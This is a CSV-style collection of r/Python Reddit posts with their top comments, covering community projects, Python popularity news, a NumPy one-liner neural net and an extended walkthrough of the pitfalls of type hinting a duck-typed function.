"I was hired partly because of my knowledge of python, but head of IT won’t let me install it…",oxoldd,2021-08-04 16:57:52,"Less of a question more of a smh kind of rant. I was picked up for an ‘entry’ level job in the winter, which I enjoy. I was given the job partly because of my (limited) coding experience, I kind of thought it would be a good place to use code ‘for the boring stuff’ and improve, and maybe use python on some of the project work. I wasn’t hired as a developer or anything but there have been times where python would have been great to use. I’ve needed to source and rename thousands of images for example for an online catalog, I could have done that in minutes with python but instead had to use excel and a convoluted VBA script… 

I’m now at the point where we’d like to design a system wherein our designers can input product data onto a program that generates the excel code or a product data file, but will automatically check for mistakes and standardise phrasing to avoid errors that have until now, been pretty common. Python seems like a nice candidate for this but I’m kind of stuck with Excel at the moment… 

Are there security concerns with python in businesses?

EDIT: thanks for all the responses guys, I’m not exactly looking for a solution to this however. I know other alternatives exist to get these jobs done, I just think it’s funny so much of my interview was excitement over python and then being told almost immediately after starting I couldn’t use it.","My approach would be to calculate some estimation about how much installing Python would have and could save saved time with your task, convert the time to money and use that as an argument to ask your supervisor to talk sense to IT.

Otherwise, if this is an important issue to you, then update your CV and look for alternative jobs."
Coding in python sometimes feels like writing a really weird tongue twister...,b1h8za,2019-03-16 00:52:53,,Which ide is this?
Better Python console apps with Rich,jyi8ku,2020-11-22 04:46:11,,"Rich is a great library! I've been using it for a while to make my Python REPL pretty, this blog post sums things up well! ![gif](emote|free_emotes_pack|feels_good_man)"
i mapped the whole C standard library to python,vd6yt2,2022-06-16 06:49:19,"might be a bit buggy right now, but here's a quick example:
```py
from pointers import fopen, fclose, fprintf # this is all type safe and cross platform as well

file = fopen('/dev/null', 'w')
fprintf(file, ""hello"")
fclose(file)
```

repo: https://github.com/ZeroIntensity/pointers.py",Who hurt you?
A horrifying single line neural network using NumPy,mk04fg,2021-04-05 01:00:19,"    import numpy as u;X=u.array([[0,0],[0,1],[1,0],[1,1]]);y=u.array([[0],[1],[1],[0]]);nn={'input':X,'w1':u.random.rand(X.shape[1],4),'w2':u.random.rand(4,1),'y':y,'o':u.zeros(y.shape)};s=lambda x:x*(1.-x);[(nn.update({'l1':1./(1+u.exp(-u.dot(nn['input'],nn['w1']))),}),nn.update({'o':1./(1+u.exp(-u.dot(nn['l1'],nn['w2'])))}),nn.update({'w1':nn['w1']+u.dot(nn['input'].T,(u.dot(2*(nn['y']-nn['o'])*s(nn['o']),nn['w2'].T)*s(nn['l1']))),'w2':nn['w2']+u.dot(nn['l1'].T,(2*(nn['y']-nn['o'])*s(nn['o'])))})) for i in range(1500)];print(nn['o'])

I followed a [tutorial](https://towardsdatascience.com/how-to-build-your-own-neural-network-from-scratch-in-python-68998a08e4f6) a while back for the original, and today I wanted to break every rule in PEP-8 and try and compact it into a single line. I still think this could be compacted further and would be interesting to try and make it without numpy!

The example data is a XOR truth table.

Here is its output:

    [[0.07890343]
     [0.9348799 ]
     [0.93513069]
     [0.05581925]]

Even with a three-argument table:

    [[0.95127264]
     [0.02120538]
     [0.01250151]
     [0.02080481]
     [0.02143134]
     [0.00877311]
     [0.02076787]
     [0.9776844 ]]

[Here is a link to the slightly expanded version.](https://github.com/sphynxy/hell/blob/ba6086e160183f8e4af2f8872d23ff59c7b3e519/maching-learning-expanded.py)

Edit: added original tutorial link",Tag this NSFW
"Using Python and Spotify Web API, you can make an ""endless"" playlist based of the Rolling Stone Magazine's top 500 albums of all time",k62xlu,2020-12-04 02:25:50,,TIL Spotify has an API
Send SMS Text Message With Python Using GMail SMTP For Free,mikh28,2021-04-02 21:33:25,"Video: [https://youtu.be/hKxtMaa2hwQ](https://youtu.be/hKxtMaa2hwQ)

Source: [https://github.com/acamso/demos/blob/master/\_email/send\_txt\_msg.py](https://github.com/acamso/demos/blob/master/_email/send_txt_msg.py)

This  is a demonstration on how to send a text message with Python. In  this  example, we use GMail to send the SMS message; but any host can  work  with the correct SMTP settings.","Such a useful trick! I drive an EV and there was a very much in-demand charger down the block that was free.  My idea was to only charge at work and have my commuting costs paid for.  But my plan never worked as there was always someone at this charger.  [Chargepoint](https://www.chargepoint.com/) exposes an API so you can check on the status of their chargers.  I'd swing by in the morning and if it was busy, I'd go to the office and start my script.  It checks every 30 seconds.  As soon as the charger was idle, I'd send myself a text message like this.  I'd zip over there and get the charger and for a long time did a good job of optimizing my commuting costs!"
[Project] carefree-learn: Tabular Datasets ❤️ PyTorch,kfwx2l,2020-12-19 07:59:10,"> [GitHub](https://github.com/carefree0910/carefree-learn)
> 
> [Documentation](https://carefree0910.me/carefree-learn-doc/)
> 
> [PyTorch Official Medium Post](https://medium.com/pytorch/carefree-learn-tabular-datasets-%EF%B8%8F-pytorch-e329b2f008f2)

You like PyTorch? You like scikit-learn? Then you'll like carefree-learn!

Enjoy training neural networks on tabular datasets with one line of code:

```python
import cflearn

m = cflearn.make().fit(x, y)
```","Whole reason I started learning Python was to play with neural nets and making basic simulations with them, this seems like it could be a huge help for that, because currently training is a positively bloated mess in my code.  Thanks for sharing."
I have been learning python as my first language for a few months now and I finally made a project I think is fun and proud enough of to show off.,f6tjds,2020-02-20 22:06:02,,Awesome! Now learn to make a music player with GUI!
I had tried to visualise the sorting of a data structure for the programmers who are new in data structure,iy48av,2020-09-23 13:25:49,,"I'd really recommend getting into the habit of thinking about variable naming, even in small projects like this. I tried to look at your source code and it's all `a`, `p`, etc.

Other than that, good job! Maybe you could somehow flash the two values being compared? I would want it to somehow visualize what it is actually doing (rather than just moving purple bars, actually show what bar is the current selected one and what bar it's currently comparing against)"
Python tool to turn images into sound by creating a sound whose spectrogram looks like the image. Motivated by DOOM hiding satanic symbols in its soundtrack. [OC],eecd17,2019-12-23 07:52:08,,"Most sounds are intricate combinations of many acoustic waves each  having different frequencies and intensities. A spectrogram is a way to  represent sound by plotting time on the horizontal axis and the  frequency spectrum on the vertical axis. Sort of like sheet music on  steroids.

What this tool does is, taking an image and simply interpreting it as  a spectrogram. Therefore, by generating the corresponding sound, we  have embedded our image in a spectrogram. Quite fun and pointless. 

You can find the tool @ [GitHub](https://github.com/LeviBorodenko/spectrographic)"
Web Scraping 1010 with Python,ikliwj,2020-09-01 22:43:33,,"I'm about to start a new Django project mainly focused on web scraping + statistics, I know BeautifulSoup's basics and Selenium as well. But I encountered many problems with beautifulsoup especially when HTML isn't conventionally written or if it's full of js, I don't know if I should try Scrapy. 
I think Selenium headless is a bit overkill tho"
"I learnt to use ASTs to patch 100,000s lines of python code",nstf0t,2021-06-05 19:10:10," I had to patch 100,000s of lines of code across 10 systems. So, I used Abstract Syntax Trees to write auto-patch scripts and in the process learnt how powerful ASTs are. I have explained what I did and my learning in the attached article. Hope this helps some of you folks out there.

[https://engineering.soroco.com/abstract-syntax-tree-for-patching-code-and-assessing-code-quality/](https://engineering.soroco.com/abstract-syntax-tree-for-patching-code-and-assessing-code-quality/)","Questions for the author: 

&#x200B;

1. Does python, in any way, make this easier or more difficult? Or does language have no bearing on the end outcome?
2. When does this technique not scale / work?
3. How do you reason for run-time side-effects or do you need not worry about that?"
"I see your minesweeper, but how about minesweeper for your terminal? Link to code in the comments.",eslbmr,2020-01-23 08:50:51,,"Hehe, seems making your own minesweeper for work is more popular than I expected. Here's my terminal version, with mouse support, and knight's move mode as well.

[https://github.com/gazpachoking/minesweeper](https://github.com/gazpachoking/minesweeper)

I found out about Kaboom in that last minesweeper post, and now I'm curious to try my hand at implementing the no guess variant as well. :)"
Python is becoming the world’s most popular coding language,928hd9,2018-07-27 10:03:21,,I would have been extra impressed if the charts were made with pyplt.
Java programmer coming to Python for the first time...,lkwjuq,2021-02-16 13:11:16,"Decided to try and do a thing in Python for the first time in a while.

Wrote a small program to test out a library in Python that I'd originally been using the Java version of.

Keep in mind I'm very, VERY used to Java and to an extent C++.

Take a guess as to what happened.

&#x200B;

It ran flawlessly with zero errors the first time I ran it.

&#x200B;

Why the hell don't I use this friggin language more often.

I'm genuinely still astonished, not a single thing I've made in Java has run flawlessly the first time I run it.

So uh, hello Python. Where the hell have you been all this time?","print(""Hello World!"")"
Made a genetic algorithm with the task of recreating an image using triangles. Used the pillow library for the image work and the rest was just math :),dhftb0,2019-10-14 04:10:49,,"could you send link to your source code if it is on github?
Edit: Op posted github link and  if anyone didn't see it, here it is:  [https://github.com/TyperOfCode/image\_algorithm/](https://github.com/TyperOfCode/image_algorithm/)"
The Google reCaptcha solver bot that I made in action.,8o9k0s,2018-06-04 00:12:38,,Nice work dude! Is it open source?
"""Automate the Boring Stuff with Python"" online course is free to sign up for the next few days with code MAR2021FREE",lx4tmd,2021-03-04 05:27:53,"https://inventwithpython.com/automateudemy (This link will automatically redirect you to the latest discount code.)

You can also click this link or manually enter the code: MAR2021FREE

https://www.udemy.com/course/automate/?couponCode=MAR2021FREE

This promo code works until the 4th (I can't extend it past that). Sometimes it takes an hour or so for the code to become active just after I create it, so if it doesn't work, go ahead and try again a while later. I'll change it to MAR2021FREE2 in three days.

Udemy has changed their coupon policies, and I'm now only allowed to make 3 coupon codes each month with several restrictions. Hence why each code only lasts 3 days. **I won't be able to make codes after this period**, but I will be making free codes next month. [Meanwhile, the first 15 of the course's 50 videos are free on YouTube.](https://www.youtube.com/watch?v=1F_OgqRuSdI&list=PL0-84-yl1fUnRuXGFe_F7qSH1LEnn9LkW)

You can also purchase the course at a discount using my code JAN2021CODE or FEB2021CODE (try both if one doesn't work) or clicking https://inventwithpython.com/automateudemy to redirect to the latest discount code. I have to manually renew this each month (until I get that automation script done). And the cheapest I can offer the course is about $16 to $18. (Meanwhile, this lets Udemy undercut my discount by offering it for $12, and I don't get the credit for those referral signups. Blerg.)

**Frequently Asked Questions:** (*read this before posting questions*)

* This course is for beginners and assumes no previous programming experience, but the second half is useful for experienced programmers who want to learn about various third-party Python modules.
* If you don't have time to take the course now, that's fine. Signing up gives you lifetime access so you can work on it at your own pace.
* This Udemy course covers roughly the same content as the 1st edition book (the book has a little bit more, but all the basics are covered in the online course), which you can read for free online at https://inventwithpython.com
* The 2nd edition of Automate the Boring Stuff with Python is free online: https://automatetheboringstuff.com/2e/
* I do plan on updating the Udemy course for the second edition, but it'll take a while because I have other book projects I'm working on. Expect that update to happen in mid-2021. If you sign up for this Udemy course, you'll get the updated content automatically once I finish it. It won't be a separate course.
* It's totally fine to start on the first edition and then read the second edition later. I'll be writing a blog post to guide first edition readers to the parts of the second edition they should read.
* I wrote a blog post to cover [what's new in the second edition](https://inventwithpython.com/blog/2019/10/07/whats-new-in-the-2nd-edition-of-automate-the-boring-stuff-with-python/)
* **You're not too old to learn to code. You don't need to be ""good at math"" to be good at coding.**
* Signing up is the first step. Actually finishing the course is the next. :) [There are several ways to get/stay motivated.](https://www.reddit.com/r/learnprogramming/wiki/faq#wiki_how_can_i_get.2Fstay_motivated_to_learn_programming.3F) I suggest getting a ""gym buddy"" to learn with. Check out /r/ProgrammingBuddies",Thanks. Hopefully I stop slacking off and start one of my many Udemy courses. Be well
Trained an deep learning model to recognize hand written numbers then made a small GUI to enter my own numbers on the screen,giuxez,2020-05-13 16:22:48,,wow nice but only psychopaths write 4 like that lol just kidding amazing work buddy
Don’t laugh at me! Like this is completely not my lane. I’m from the hood.,x9cf74,2022-09-09 05:31:21,"But I’m super happy that I figured out a piece of code and it’s working! Coded a selenium Instagram Unfollow bot. All the code I found and tutorials didn’t work. I literally had to google find a piece of code that worked then 10 other pieces that didn’t work and kinda piece it together until the shit just worked and I’m happy bro. The funny thing is, I still don’t know wtf I’m doing 😂 I hope I’m able to get better tho… I put it to unfollow every 60 seconds so hopefully I don’t get banned…",Your process is everyone's process. 70% of coding is knowing where to find the code you need.
So I like to eat and I like to code but I dont like full priced items - I built a tool to find all sales at various groceries every day so I know how to plan my meals! Take a look - its open source!,ntew6a,2021-06-06 13:54:41,"Edit: some people have reached out to fork/explore the repo - I would love to let it be known that I would love to work with anyone who wants to embark on the integration journey with me - always open to suggestions/code contributions/etc. Just reach out!!!!

Hi everyone, been a long time lurker here inspired by the resourcefulness and commitment of people on this subreddit to finding clever ways to pinch every penny.

tldr: I code a ton and I made one of my programs accessible on the web so people can see Whole Foods sale items near them with less hassle! [Access the tool here](https://wholey-frugal.herokuapp.com): [https://wholey-frugal.herokuapp.com](https://wholey-frugal.herokuapp.com/) and if interested I am happy to share any and all code!

I have worked on many web scraping/coding projects for fun in the past so last year I wrote a bit of code to find all sale items at all the Whole Foods near me and then yield a list with the items (alongside with the store name with the sale closest to me). I then decided that I wanted to share what I made with you all in case it even helps one person - this is a personal project, no ads, nothing of the sort.

Just type in your ZIP Code (eg. 38103), City + State Abbreviation (eg. Memphis TN), or address and it will do all the work - I plan to work out a couple more hiccups in the code later today but for the most part it works for decently sized cities

&#x200B;

https://preview.redd.it/51zor53g4l371.png?width=2282&format=png&auto=webp&s=d09c9ad12248192eec0b559affe1b29deee8510f

&#x200B;

https://preview.redd.it/bkf2l55h4l371.png?width=1458&format=png&auto=webp&s=896c01f500c76f87e3b294219cadd3f9652723fc

You can find the project here: [https://wholey-frugal.herokuapp.com](https://wholey-frugal.herokuapp.com) and I would love any and all suggestions for other projects/thoughts on this one!! (I am working on a recipe list to match all sale items just because why not!!)

Open source here: [https://github.com/ws2516/WholeFoodsFrugality](https://github.com/ws2516/WholeFoodsFrugality)","someone on r/frugal is sure to find this useful

Edit: checked your history and you've done that and more, ill be checking it out tomorrow but it seems like a super cool little project"
Is it possible to do this with Python?,ex4fwo,2020-02-01 18:46:37,,"Not really. Python doesn't have a preprocessor, so you can't modify syntax like that."
Recoding flappy bird in python with pygame,cua7xr,2019-08-23 14:55:14,,Side tip: You can record your screen via OBS or ShareX instead of using your phone
"What're the cleanest, most beautifully written projects in Github that are worth studying the code?",sg3owy,2022-01-30 15:22:52,,"I haven't seen anyone else mention it, but I think [Black](https://github.com/psf/black) has some of the best Python code I've ever seen especially considering that it's solving a relatively complicated problem."
Why Type Hinting Sucks!,10zdidm,2023-02-11 13:45:59,"Type hints are great! But I was [playing Devil's advocate](https://www.reddit.com/r/Python/comments/10vh1v5/mypy_10_released/j7igi8q/?context=3) on a thread recently where I claimed actually type hinting can be legitimately annoying, especially to old school Python programmers.

But I think a lot of people were skeptical, so let's go through a made up scenario trying to type hint a simple Python package. Go to the end for a TL;DR.

# The scenario 

This is completely made up, all the events are fictitious unless explicitly stated otherwise (also editing this I realized attempts 4-6 have even more mistakes in them than intended but I'm not rewriting this again):

**You** maintain a popular third party library `slowadd`, your library has many supporting functions, decorators, classes, and metaclasses, but your main function is:

    def slow_add(a, b):
        time.sleep(0.1)
        return a + b

You've always used traditional Python duck typing, if a and b don't add then the function throws an exception. But you just dropped support for Python 2 and your users are demanding type hinting, so it's your next major milestone.

# First attempt at type hinting

You update your function:

    def slow_add(a: int, b: int) -> int:
        time.sleep(0.1)
        return a + b

All your tests pass, mypy passes against your personal code base, so you ship with the release note ""Type Hinting Support added!""

# Second attempt at type hinting

Users immediately flood your GitHub issues with complaints! MyPy is now failing for them because they pass floats to `slow_add`, build processes are broken, they can't downgrade because of internal Enterprise policies of always having to increase type hint coverage, their weekend is ruined from this issue.

You do some investigating and find that MyPy supports [Duck type compatibility](https://mypy.readthedocs.io/en/latest/duck_type_compatibility.html) for `ints -> floats -> complex`. That's cool! New release:

    def slow_add(a: complex, b: complex) -> complex:
        time.sleep(0.1)
        return a + b

Funny that this is a MyPy note and not a PEP standard...

# Third attempt at type hinting

Your users thank you for your quick release, but a couple of days later one user asks why you no longer support `Decimal`. You replace `complex` with `Decimal` but now your other MyPy tests are failing.

You remember Python 3 added [Numeric abstract base classes](https://docs.python.org/3/library/numbers.html), what a perfect use case, just type hint everything as `numbers.Number`.

Hmmm, MyPy doesn't consider any of integers, or floats, or Decimals to be numbers :(.

After reading through [typing](https://docs.python.org/3/library/typing.html) you guess you'll just `Union` in the Decimals:

    def slow_add(
        a: Union[complex, Decimal], b: Union[complex, Decimal]
    ) -> Union[complex, Decimal]:
        time.sleep(0.1)
        return a + b

Oh no! MyPy is complaining that you can't add your other number types to Decimals, well that wasn't your intention anyway...

More reading later and you try overload:

    @overload
    def slow_add(a: Decimal, b: Decimal) -> Decimal:
        ...

    @overload
    def slow_add(a: complex, b: complex) -> complex:
        ...

    def slow_add(a, b):
        time.sleep(0.1)
        return a + b

But MyPy on strict is complaining that `slow_add` is missing a type annotation, after reading [this issue](https://github.com/python/mypy/issues/3360) you realize that `@overload` is only useful for users of your function but the body of your function will not be tested using `@overload`. Fortunately in the discussion on that issue there is an alternative example of how to implement:


    T = TypeVar(""T"", Decimal, complex)

    def slow_add(a: T, b: T) -> T:
        time.sleep(0.1)
        return a + b

# Fourth attempt at type hinting

You make a new release, and a few days later more users start complaining. A very passionate user explains the super critical use case of adding tuples, e.g. `slow_add((1, ), (2, ))`

You don't want to start adding each type one by one, there must be a better way! You learn about Protocols, and Type Variables, and positional only parameters, *phew*, this is a lot but this should be perfect now:


    T = TypeVar(""T"")

    class Addable(Protocol):
        def __add__(self: T, other: T, /) -> T:
            ...

    def slow_add(a: Addable, b: Addable) -> Addable:
        time.sleep(0.1)
        return a + b


# A mild diversion

You make a new release noting ""now supports any addable type"".

Immediately the tuple user complains again and says type hints don't work for longer Tuples: `slow_add((1, 2), (3, 4))`. That's weird because you tested multiple lengths of Tuples and MyPy was happy.

After debugging the users environment, via a series of ""back and forth""s over GitHub issues, you discover that pyright is throwing this as an error but MyPy is not (even in strict mode). You **assume** MyPy is correct and move on in bliss ignoring there is actually a fundamental mistake in your approach so far.

(**Author Side Note** - It's not clear [if MyPy is wrong](https://github.com/python/mypy/issues/14679) but it defiantly makes sense for Pyright to throw an error here, I've filed issues against both projects and a pyright maintainer has [explained the gory details](https://github.com/microsoft/pyright/issues/4613/) if you're interested. Unfortunately this was not really addressed in this story until the ""Seventh attempt"")


# Fifth attempt at type hinting

A week later a user files an issue, the most recent release said that ""now supports any addable type"" but they have a bunch of classes that can *only* be implemented using `__radd__` and the new release throws typing errors.

You try a few approaches and find this seems to best solve it:

    T = TypeVar(""T"")

    class Addable(Protocol):
        def __add__(self: T, other: T, /) -> T:
            ...

    class RAddable(Protocol):
        def __radd__(self: T, other: Any, /) -> T:
            ...

    @overload
    def slow_add(a: Addable, b: Addable) -> Addable:
        ...

    @overload
    def slow_add(a: Any, b: RAddable) -> RAddable:
        ...

    def slow_add(a: Any, b: Any) -> Any:
        time.sleep(0.1)
        return a + b

Annoyingly there is now no consistent way for MyPy to do anything with the body of the function. Also you weren't able to fully express that when b is ""RAddable"" that ""a"" should not be the same type because Python type annotations don't yet support being able to exclude types.

# Sixth attempt at type hinting

A couple of days later a new user complains they are getting type hint errors when trying to raise the output to a power, e.g. `pow(slow_add(1, 1), slow_add(1, 1))`. Actually this one isn't too bad, you quick realize the problem is your annotating Protocols, but really you need to be annotating Type Variables, easy fix:

    T = TypeVar(""T"")

    class Addable(Protocol):
        def __add__(self: T, other: T, /) -> T:
            ...

    A = TypeVar(""A"", bound=Addable)

    class RAddable(Protocol):
        def __radd__(self: T, other: Any, /) -> T:
            ...

    R = TypeVar(""R"", bound=RAddable)

    @overload
    def slow_add(a: A, b: A) -> A:
        ...

    @overload
    def slow_add(a: Any, b: R) -> R:
        ...

    def slow_add(a: Any, b: Any) -> Any:
        time.sleep(0.1)
        return a + b


# Seventh attempt at type hinting

Tuple user returns! He says MyPy in strict mode is now complaining with the expression `slow_add((1,), (2,)) == (1, 2)` giving the error:

> Non-overlapping equality check (left operand type: ""Tuple[int]"", right operand type: ""Tuple[int, int]"")

You realize you can't actually guarantee anything about the return type from some arbitrary `__add__` or `__radd__`, so you starting throwing `Any` Liberally around:

    class Addable(Protocol):
        def __add__(self: ""Addable"", other: Any, /) -> Any:
            ...

    class RAddable(Protocol):
        def __radd__(self: ""RAddable"", other: Any, /) -> Any:
            ...

    @overload
    def slow_add(a: Addable, b: Any) -> Any:
        ...

    @overload
    def slow_add(a: Any, b: RAddable) -> Any:
        ...

    def slow_add(a: Any, b: Any) -> Any:
        time.sleep(0.1)
        return a + b


# Eighth attempt at type hinting

Users go crazy! The nice autosuggestions their IDE provided them in the previous release have all gone! Well you can't type hint the world, but I guess you could include type hints for the built-in types and *maybe* some Standard Library types like Decimal:

You think you can rely on some of that MyPy duck typing but you test:

    @overload
    def slow_add(a: complex, b: complex) -> complex:
        ...

And realize that MyPy throws an error on something like `slow_add(1, 1.0).as_integer_ratio()`. So much for that nice duck typing article on MyPy you read earlier.

So you end up implementing:

    class Addable(Protocol):
        def __add__(self: ""Addable"", other: Any, /) -> Any:
            ...

    class RAddable(Protocol):
        def __radd__(self: ""RAddable"", other: Any, /) -> Any:
            ...

    @overload
    def slow_add(a: int, b: int) -> int:
        ...

    @overload
    def slow_add(a: float, b: float) -> float:
        ...

    @overload
    def slow_add(a: complex, b: complex) -> complex:
        ...

    @overload
    def slow_add(a: str, b: str) -> str:
        ...

    @overload
    def slow_add(a: tuple[Any, ...], b: tuple[Any, ...]) -> tuple[Any, ...]:
        ...

    @overload
    def slow_add(a: list[Any], b: list[Any]) -> list[Any]:
        ...

    @overload
    def slow_add(a: Decimal, b: Decimal) -> Decimal:
        ...

    @overload
    def slow_add(a: Fraction, b: Fraction) -> Fraction:
        ...

    @overload
    def slow_add(a: Addable, b: Any) -> Any:
        ...

    @overload
    def slow_add(a: Any, b: RAddable) -> Any:
        ...

    def slow_add(a: Any, b: Any) -> Any:
        time.sleep(0.1)
        return a + b

As discussed earlier MyPy doesn't use the signature of any of the overloads and compares them to the body of the function, so all these type hints have to manually validated as accurate by you.

# Ninth attempt at type hinting

A few months later a user says they are using an embedded version of Python and it hasn't implemented the Decimal module, they don't understand why your package is even importing it given it doesn't use it. So finally your code looks like:

    from __future__ import annotations

    import time
    from typing import TYPE_CHECKING, Any, Protocol, TypeVar, overload

    if TYPE_CHECKING:
        from decimal import Decimal
        from fractions import Fraction


    class Addable(Protocol):
        def __add__(self: ""Addable"", other: Any, /) -> Any:
            ...

    class RAddable(Protocol):
        def __radd__(self: ""RAddable"", other: Any, /) -> Any:
            ...

    @overload
    def slow_add(a: int, b: int) -> int:
        ...

    @overload
    def slow_add(a: float, b: float) -> float:
        ...

    @overload
    def slow_add(a: complex, b: complex) -> complex:
        ...

    @overload
    def slow_add(a: str, b: str) -> str:
        ...

    @overload
    def slow_add(a: tuple[Any, ...], b: tuple[Any, ...]) -> tuple[Any, ...]:
        ...

    @overload
    def slow_add(a: list[Any], b: list[Any]) -> list[Any]:
        ...

    @overload
    def slow_add(a: Decimal, b: Decimal) -> Decimal:
        ...

    @overload
    def slow_add(a: Fraction, b: Fraction) -> Fraction:
        ...

    @overload
    def slow_add(a: Addable, b: Any) -> Any:
        ...

    @overload
    def slow_add(a: Any, b: RAddable) -> Any:
        ...

    def slow_add(a: Any, b: Any) -> Any:
        time.sleep(0.1)
        return a + b


# TL;DR

Turning even the simplest function that relied on Duck Typing into a Type Hinted function that is useful can be painfully difficult.

Please always put on your empathetic hat first when asking someone to update their code to how you think it should work.

In writing up this post I learnt a lot about type hinting, please try and find edge cases where my type hints are wrong or could be improved, it's a good exercise.

**Edit:** Had to fix a broken link.

**Edit 2:** It was late last night and I gave up on fixing everything, some smart people nicely spotted the errors!

I have a ""tenth attempt"" to address these error. But pyright complains about it because my overloads overlap, however I don't think there's a way to express what I want in Python annotations without overlap. Also Mypy complains about some of the user code I posted earlier giving the error [comparison-overlap](https://mypy.readthedocs.io/en/stable/error_code_list2.html#check-that-comparisons-are-overlapping-comparison-overlap), interestingly though pyright seems to be able to detect here that the types don't overlap in the user code.

I'm going to file issues on pyright and mypy, but fundamentally they might be design choices rather than strictly bugs and therefore a limit on the current state of Python Type Hinting:

    T = TypeVar(""T"")

    class SameAddable(Protocol):
        def __add__(self: T, other: T, /) -> T:
            ...

    class Addable(Protocol):
        def __add__(self: ""Addable"", other: Any, /) -> Any:
            ...

    class SameRAddable(Protocol):
        def __radd__(self: T, other: Any, /) -> T:
            ...

    class RAddable(Protocol):
        def __radd__(self: ""RAddable"", other: Any, /) -> Any:
            ...

    SA = TypeVar(""SA"", bound=SameAddable)
    RA = TypeVar(""RA"", bound=SameRAddable)


    @overload
    def slow_add(a: SA, b: SA) -> SA:
        ...

    @overload
    def slow_add(a: Addable, b: Any) -> Any:
        ...

    @overload
    def slow_add(a: Any, b: RA) -> RA:
        ...

    @overload
    def slow_add(a: Any, b: RAddable) -> Any:
        ...

    def slow_add(a: Any, b: Any) -> Any:
        time.sleep(0.1)
        return a + b","If you have a super-generic function like that and type hinting enforced, you just use `Any` and don't care about it.

It's better than not type hinting your codebase at all, as in 99% of cases you can use the proper hints.

Working in a big python codebase without type hints is a huge PIA."
"Guido van Rossum ""honored"" as Python becomes #1 most popular programming language on TIOBE ranking, passing C and Java",q5cnnk,2021-10-11 01:34:29,,"Mind you, a dip as sharp as that in C's popularity is probably a short-term methodology oddity since its popularity has been between 15% and 20% for most of the past 2 decades. When Java dipped in 2004, TIOBE blamed that on a change in Google's methodology so TIOBE had to make a correction to fix it. C dipped sharply for a while in 2017 for unexplained reasons, and this dip looks similar. I'd guess that Python will need another 2 or 3 years before it's more permanently above C."
Notebooks suck: change my mind,spxim1,2022-02-11 19:42:22,"Just switched roles from ml engineer at a company that doesn’t use notebooks to a company that uses them heavily. I don’t get it. They’re hard to version, hard to distribute, hard to re-use, hard to test, hard to review. I dont see a single benefit that you don’t get with plain python files with 0 effort.


ThEyRe InTErAcTiVe…

So is running scripts in your console. If you really want to go line-by-line use a repl or debugger.

Someone, please, please tell me what I’m missing, because I feel like we’re making a huge mistake as an industry by pushing this technology.

edit: Typo

Edit: So it seems the arguments for notebooks fall  in a few categories. The first category is “notebooks are a personal tool, essentially a REPL with a diffferent interface”. If this was true I wouldn’t care if my colleagues used them, just as I don’t care what editor they use. The problem is it’s not true. If I ask someone to share their code with me, nobody in their right mind would send me their ipython history. But people share notebooks with me all the time. So clearly notebooks are not just used as a REPL.

The second argument is that notebooks are good for exploratory work. Fair enough, I much prefer ipython for this, but to each their own. The problem is that the way people use notebooks in practice is to write end to end modeling code that needs to be tested and rerun on new data continuously. This is production code, not exploratory or prototype code. Most major cloud providers encourage this workflow by providing development and pipeline services centered around notebooks (I’m looking at you AWS, GCP and Databricks).

Finally, many people think that notebooks are great for communicating or reporting ideas. Fair enough I can appreciate that use case. Bus as we’ve already established, they are used for so much more.","In my eyes they are great for exploring datasets and playing around until you have a solution matching your problem (essentially prototyping).
Once done with this I prefer having the solution in plain Python."
Six more quick ways to improve your Python,j6n6wt,2020-10-07 16:25:21,,TIL about using \`or\` to assign a variable
"Quickly fetch your WiFi password and if needed, generate a QR code of your WiFi to allow phones to easily connect. Works on macOS and Linux and Windows",l6dqvx,2021-01-28 04:34:11,"&#x200B;

https://i.redd.it/nv8qimciqxd61.gif

Hey!

I just wanted to share a neat little tool I made earlier this week. It allows you to get your WiFi password and if you want, you can generate a QR code so that your friends can scan the QR code to quickly connect to your WiFi.

GitHub: [https://github.com/sdushantha/wifi-password](https://github.com/sdushantha/wifi-password)

Let me know what you guys think about it :)","I love this. It’s so simple and beautiful!

Edit: As a next step, to make it accessible to more people, I'd recommend turning it into a pip-installable package (the PyPi website walks you through the whole process). This makes it really easy for users (they don't need to install dependencies separately, and it gives you versioning). Plus, you can make it work as a command-line interface program that can be run from anywhere on your machine."
"Play detective on Reddit: Discover political trolls, secret influencers and more",jpt7s7,2020-11-07 23:59:38,,Did you use neo4j for this? Looks good
"Why Python 4.0 might never arrive, according to its creator",nklez0,2021-05-25 17:17:16,,"Probably a good thing!    A mature language should not go about breaking compatibility willy nilly.    I'm talking at least a decade and better more than  a decade between releases that break compatibility.   As such I would expect Python to remain stable until at least 2030.

That doesn't mean we will not see improvements.    There is a lot to do frankly too improve Python including phasing out older systems, libs and such.   The thing is deprecated features must be well marked / announced with hard cut off dates that give people plenty of time to morph their software to use new solutions.    Further hard cut off dates need to be hard, non of this constant resetting we saw with Python 3."
Instagram Makes a Smooth Move to Python 3 - The New Stack,6hgsqr,2017-06-16 02:10:59,,"Instagram gave a great keynote at Pycon this year regarding the techniques they used to accomplish the migration.  It was a really well done and interesting talk, you can find it [here.](https://www.youtube.com/watch?v=66XoCk79kjM)"
Particle physics in Pygame with a view and a basic GUI (menu and plots),gigyew,2020-05-13 02:18:41,,"Hello everyone !

Here is a quick look at a physics engine I'm currently coding. The idea will be to use this physics engine to illustrate physics through simulation and visualisation. Moreover, I would like to illustrate more than mechanics, like electromagnetism, optics, etc.

However, for now, it's only Newton particle based physics :)

Everything is done in python and pygame. Some of the features :

\- On the left, a Viewer that show in real time every particle. Zoom can be made on the viewer. We can follow particle individually by selecting them

\- On the right, a menu to select entities and a real time plotter

\- For the physic, it is Newton mechanics with Euler method to solve the movement equation. There is an attractor in the middle of the world, which exerts a force in 1/r.

Please feel free to comment :)

Cheers !"
"I'm no data scientist, can somebody explain the correlation to me?",a1rgaq,2018-11-30 18:56:06,,The hentai's watchers just stoped watching porn and starting doing python.
RepostSleuthBot - Now Public,kyb9rc,2021-01-16 11:47:23,"I've been working on this project for the last 2 years. It has gotten super popular and I've had a ton of requests to open the code up.  I was always resistant since I considered it kind of a mess.  I decided to take some time to clean it up a bit and make the repo public.

It has a lot going on, but nothing very complicated.

It makes heavy use of Celery for scheduling jobs and runs \~20 Docker containers for the various services.

It's not something you would easily be able to deploy on your own, however, I figured some people might be interested in seeing the workings.

[https://github.com/barrycarey/RedditRepostSleuth](https://github.com/barrycarey/RedditRepostSleuth)",the legend himself
I made a Desktop Application to displays the bond-line structure of any chemical compound/molecule.(inspired by u/hvrc23 's work),bh90iy,2019-04-25 22:04:15,,"Wow! Fantastic job! May I ask, what did you use to create GUI and buttons etc... I have so far only written CLI programs in Python.

&#x200B;

P.s. Does your program work in Linux?"
